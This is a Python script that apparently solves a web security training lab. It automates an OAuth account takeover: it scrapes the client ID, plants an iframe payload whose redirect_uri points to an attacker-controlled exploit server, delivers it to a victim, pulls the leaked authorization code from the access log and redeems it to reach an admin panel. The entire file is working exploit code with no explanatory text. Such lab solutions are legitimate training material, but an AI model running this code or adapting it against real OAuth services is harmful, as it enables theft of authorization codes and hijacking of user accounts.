from requests import Session
from bs4 import BeautifulSoup
import requests

host = 'https://0a81004e03a019f080e92bb800c100e0.web-security-academy.net'


def getOauthInfo(host):
    s = Session()
    r = s.get(f"{host}/my-account", allow_redirects=True)

    soup = BeautifulSoup(r.text, "html.parser")
    tag = soup.meta

    auth_url = tag.attrs['content'].split('3;url=')[1]
    oauth_host = auth_url.split('/')[2]
    client_id = auth_url.split('=')[1].split('&')[0]

    return oauth_host, client_id

    


def build_payload(oauth_host, client_id):
    r = requests.get(host)
    soup = BeautifulSoup(r.text, "html.parser")
    tag = soup.find('a', {"id": 'exploit-link'})
    exploit_link = tag.attrs['href']

    payload = f'<iframe src="https://{oauth_host}/auth?client_id={client_id}&redirect_uri={exploit_link}&response_type=code&scope=openid%20profile%20email"></iframe>'
    return payload, exploit_link


def deliver_exploit(payload, exploit_link):
    r = requests.post(f'{exploit_link}/',
                      data={'urlIsHttps': 'on',
                            'responseFile': '/exploit',
                            'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
                            'responseBody': payload,
                            'formAction': 'DELIVER_TO_VICTIM'
                            })
    r = requests.post(f'{exploit_link}/',
                      data={'urlIsHttps': 'on',
                            'responseFile': '/exploit',
                            'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
                            'responseBody': payload,
                            'formAction': 'ACCESS_LOG'
                            })
    code = r.text.split('code=')[1].split('HTTP/')[0]

    return code

def hack(code):
    r = requests.get(f'{host}/oauth-callback', params={'code': code})
    print(code)

    if 'Admin panel' in r.text: print('Success!')
    


if __name__ == '__main__':
    oauth_host, client_id = getOauthInfo(host)
    payload, exploit_link = build_payload(oauth_host, client_id)
    code = deliver_exploit(payload, exploit_link)
    hack(code)